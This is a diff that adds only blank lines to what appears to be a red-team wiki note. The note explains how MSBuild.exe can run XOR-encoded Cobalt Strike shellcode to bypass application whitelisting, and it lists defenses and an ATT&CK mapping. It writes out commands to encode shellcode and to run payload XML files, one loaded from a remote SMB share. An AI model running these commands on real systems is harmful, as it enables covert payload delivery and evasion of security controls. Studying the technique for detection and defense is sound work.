@@ -33,11 +33,15 @@ MSBuild is a command-line tool used to build .NET applications. In this case, it
 
 MSBuild is a command-line tool used to build .NET applications. In this case, it can also be used to execute shellcode within a .NET executable. This technique can be useful for bypassing certain security controls that may be in place. By using MSBuild, attackers can execute shellcode without having to drop it to disk, making it more difficult to detect. This technique can be used in conjunction with Cobalt Strike to deliver a custom payload to a target system. By using a custom payload, attackers can evade signature-based detection and increase their chances of success.
 
+ 
+
 ## Requirements
 
 1. Access to a system with MSBuild installed
 
 1. Cobalt Strike
+
+ 
 
 ## Defense
 
@@ -47,6 +51,8 @@ MSBuild is a command-line tool used to build .NET applications. In this case, it
 
 1. Monitor for suspicious use of MSBuild
 
+ 
+
 ## Objectives
 
 1. Execute shellcode on a target system
@@ -54,6 +60,8 @@ MSBuild is a command-line tool used to build .NET applications. In this case, it
 1. Bypass security controls
 
 1. Deliver a custom payload
+
+ 
 
 # Instructions
 
@@ -64,10 +72,18 @@ MSBuild is a command-line tool used to build .NET applications. In this case, it
   - For 64-bit systems: C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
   - For 32-bit systems: %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml
 
+ 
+
+
+
 **Code**: [[* Attacks > Packages > Payload Generator 
 * Attack]]
 
+
+
 > MSBuild.exe is a tool used to build .NET applications. It can also be used to execute shellcode by embedding the shellcode in an XML file and using MSBuild.exe to execute it. This technique can be used to bypass application whitelisting and other security measures. The shellcode must be encoded before being embedded in the XML file to avoid detection. The shellcode_encoder.py script can be used to encode the shellcode with various options. The encoded shellcode is then embedded in the XML file using the appropriate syntax.
+
+
 
 **Command** ([[Generate Encoded Shellcode]]):
 
@@ -75,17 +91,27 @@ MSBuild is a command-line tool used to build .NET applications. In this case, it
 $ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor
 ```
 
+
+
+
+
 **Command** ([[Build x64 DNS Raw Payload]]):
 
 ```bash
 $ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
 ```
 
+
+
+
+
 **Command** ([[Build x86 DNS Raw Payload]]):
 
 ```bash
 $ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -109,3 +135,5 @@ $ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\d
 - [[Cobalt Strike]]
 - [[Custom Payloads]]
 - [[Payloads]]
+
+
